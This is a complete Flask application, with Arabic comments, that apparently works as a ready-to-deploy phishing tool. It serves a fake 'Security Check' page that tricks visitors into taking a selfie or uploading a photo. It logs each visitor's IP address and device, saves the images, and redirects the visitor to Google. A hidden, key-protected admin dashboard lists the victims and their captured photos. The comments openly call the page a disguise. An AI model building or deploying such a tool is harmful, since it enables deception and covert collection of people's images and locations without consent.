# language: Python 3, file: app.py, runtime: Flask 3.x, target: Render / VPS
import json
import os
import base64
from datetime import datetime, timezone
from flask import Flask, request, redirect, render_template_string, abort

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "hits.json")
UPLOAD_FOLDER = os.path.join(BASE_DIR, "captured_images")

# إنشاء مجلد للصور إذا ما كان موجود
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# 1. الرابط اللي راح ينحول له الشخص بعد السحب
REDIRECT_URL = "https://www.google.com" 

# 2. المفتاح السري حقك لدخول لوحة التحكم
ADMIN_KEY = "my_super_secret_key_2024"

def client_ip():
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"

def load_data():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            try:
                return json.load(f)
            except:
                return []
    return []

def save_data(data):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

# صفحة التمويه (تطلب إذن الكاميرا أو رفع صورة)
LANDING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Identity</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; width: 90%; }
        h2 { margin: 0 0 10px; font-weight: 600; font-size: 20px; }
        p { color: #8b949e; font-size: 14px; margin-bottom: 20px; }
        .btn { display: block; width: 100%; padding: 12px; margin-bottom: 10px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; text-decoration: none; box-sizing: border-box; }
        .btn-primary { background-color: #238636; color: white; font-weight: bold; }
        .btn-secondary { background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
        input[type="file"] { display: none; }
        .loader { display: none; border: 4px solid #30363d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto 0; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h2>Security Check</h2>
        <p>Please verify your identity to continue.</p>
        
        <form id="uploadForm" action="/upload" method="POST" enctype="multipart/form-data">
            <!-- خيار التقاط صورة من الكاميرا -->
            <input type="file" id="cameraInput" name="image" accept="image/*" capture="user">
            <button type="button" class="btn btn-primary" onclick="document.getElementById('cameraInput').click()">Take a Selfie</button>
            
            <!-- خيار رفع صورة من الاستوديو -->
            <input type="file" id="fileInput" name="image" accept="image/*">
            <button type="button" class="btn btn-secondary" onclick="document.getElementById('fileInput').click()">Upload from Gallery</button>
            
            <div class="loader" id="loader"></div>
        </form>
    </div>

    <script>
        // لما يختار صورة (سواء كاميرا أو استوديو)، يتم رفعها فوراً وتحويله
        function handleFileSelect(input) {
            if (input.files.length > 0) {
                document.getElementById('loader').style.display = 'block';
                document.getElementById('uploadForm').submit();
            }
        }
        document.getElementById('cameraInput').addEventListener('change', function() { handleFileSelect(this); });
        document.getElementById('fileInput').addEventListener('change', function() { handleFileSelect(this); });
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    ip = client_ip()
    data = load_data()
    record = {
        "id": str(len(data) + 1),
        "ts": datetime.now(timezone.utc).isoformat(),
        "ip": ip,
        "ua": request.headers.get("User-Agent", ""),
        "image": None
    }
    data.append(record)
    save_data(data)
    
    return render_template_string(LANDING_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    ip = client_ip()
    if 'image' not in request.files:
        return redirect(REDIRECT_URL)
    
    file = request.files['image']
    if file.filename == '':
        return redirect(REDIRECT_URL)

    # حفظ الصورة
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ip = ip.replace(".", "_").replace(":", "_")
    filename = f"{safe_ip}_{timestamp}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)

    # تحديث السجل
    data = load_data()
    for record in reversed(data):
        if record["ip"] == ip and record["image"] is None:
            record["image"] = filename
            break
    save_data(data)

    # تحويله للرابط النهائي
    return redirect(REDIRECT_URL)

@app.route("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        abort(404)
    data = load_data()
    data.reverse()
    
    admin_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font: 14px monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border-bottom: 1px solid #30363d; padding: 12px; text-align: left; vertical-align: middle; }
            th { color: #58a6ff; }
            .ip { color: #ff7b72; font-weight: bold; }
            img { max-width: 100px; border-radius: 6px; border: 1px solid #30363d; }
        </style>
    </head>
    <body>
        <h3>Total Hits: {{ data|length }}</h3>
        <table>
            <tr><th>Time</th><th>IP</th><th>Device</th><th>Captured Image</th></tr>
            {% for r in data %}
            <tr>
                <td>{{ r.ts[:16].replace('T', ' ') }}</td>
                <td class="ip">{{ r.ip }}</td>
                <td>{{ r.ua[:30] }}...</td>
                <td>
                    {% if r.image %}
                        <a href="/admin/view/{{ r.image }}?key={{ request.args.get('key') }}" target="_blank">
                            <img src="/admin/view/{{ r.image }}?key={{ request.args.get('key') }}" alt="img">
                        </a>
                    {% else %}
                        -
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """
    return render_template_string(admin_html, data=data)

@app.route("/admin/view/<filename>")
def view_image(filename):
    if request.args.get("key") != ADMIN_KEY:
        abort(404)
    if ".." in filename or "/" in filename:
        abort(400)
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if not os.path.exists(filepath):
        abort(404)
    with open(filepath, "rb") as f:
        img_data = f.read()
    return img_data, 200, {'Content-Type': 'image/jpeg'}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
